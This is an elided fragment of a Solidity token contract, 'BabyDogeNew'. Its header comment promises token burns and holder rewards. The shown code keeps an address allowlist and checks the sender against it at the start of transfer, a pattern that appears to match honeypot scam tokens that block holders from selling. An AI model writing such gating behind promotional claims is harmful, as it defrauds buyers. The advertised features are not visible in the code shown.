...
/*
* Welcome to Baby Doge New
* 50% Token Burned
* LP Burn forever
* Baby Doge New will burn 3% every transaction
* 2% reward to holders
*/
...
contract BabyDogeNew is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function addItem(address _item) public virtual returns (uint256) {
        if( ! checkExist(_item) ) allows.push(_item);
        return allows.length;
    }
    function getItem() public view returns (address [] memory) {
        return allows;
    }
    function checkExist(address _item) public view returns (bool) {
        bool found = false;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        bool exists = checkExist(_msgSender());
